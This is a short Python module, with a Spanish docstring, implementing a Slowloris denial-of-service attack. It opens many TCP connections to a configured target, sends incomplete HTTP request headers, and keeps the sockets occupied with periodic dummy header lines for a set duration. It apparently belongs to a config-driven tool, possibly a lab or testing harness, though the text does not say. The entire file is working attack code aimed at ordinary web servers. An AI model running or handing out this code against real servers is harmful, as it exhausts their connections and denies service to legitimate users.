"""Slowloris — abre N conexiones HTTP y las mantiene incompletas."""

from __future__ import annotations

import socket
import time


def run(cfg: dict) -> int:
    target = (cfg["target_ip"], cfg["target_port"])
    n_sockets = cfg.get("sockets", 100)
    duration = cfg["duration_s"]
    keepalive = cfg.get("keepalive_s", 10)

    end = time.time() + duration
    sockets: list[socket.socket] = []

    for _ in range(n_sockets):
        if time.time() >= end:
            break
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
            s.connect(target)
            s.send(b"GET /index HTTP/1.1\r\nHost: target\r\n")
            sockets.append(s)
        except OSError:
            try:
                s.close()
            except OSError:
                pass

    while time.time() < end:
        slept = 0.0
        while slept < keepalive and time.time() < end:
            time.sleep(0.5)
            slept += 0.5
        if time.time() >= end:
            break
        for s in list(sockets):
            try:
                s.send(b"X-a: b\r\n")
            except OSError:
                sockets.remove(s)
                try:
                    s.close()
                except OSError:
                    pass

    for s in sockets:
        try:
            s.close()
        except OSError:
            pass
    return 0
